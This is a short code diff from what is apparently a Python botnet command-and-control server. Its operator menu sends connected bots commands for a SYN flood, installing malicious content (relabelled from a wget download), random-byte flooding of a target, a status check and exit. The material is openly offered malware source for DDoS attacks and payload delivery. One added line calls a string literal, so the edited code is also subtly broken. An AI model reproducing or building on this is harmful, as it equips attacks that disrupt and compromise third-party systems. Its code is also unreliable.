@@ -20,7 +20,7 @@ def connectbot(clientsocketsource):
 def sendcommands(clientsocketsaddresssource):
 	while True:
 		print("Choose the type of command to execute ")
-		print("1) SYN Flood\n 2) Install content using wget \n 3) Get status of bot \n 4) Flooding of random bytes \n 5) Exit server")
+		print("1) SYN Flood\n 2) Install malicious content \n 3) Get status of bot \n 4) Flooding of random bytes \n 5) Exit server")
 
 		input_get = raw_input()
 		for row in clientsocketsaddresssource:
@@ -31,7 +31,7 @@ def sendcommands(clientsocketsaddresssource):
 				row.send(command)
 
 			if int(input_get) == 2:
-				row.send("WGET")
+				row.send("INSTALL")
 
 			if int(input_get) == 3:
 				row.send("STATUS")
@@ -39,8 +39,10 @@ def sendcommands(clientsocketsaddresssource):
 			if int(input_get) == 4:
 				row.send("\t".join(("FLOODING",TARGET)))
 
+
+
 			if int(input_get) == 5:
-				row.send("EXIT")
+				row.send("\t.join"("EXIT",TARGET))
 				break
 
 
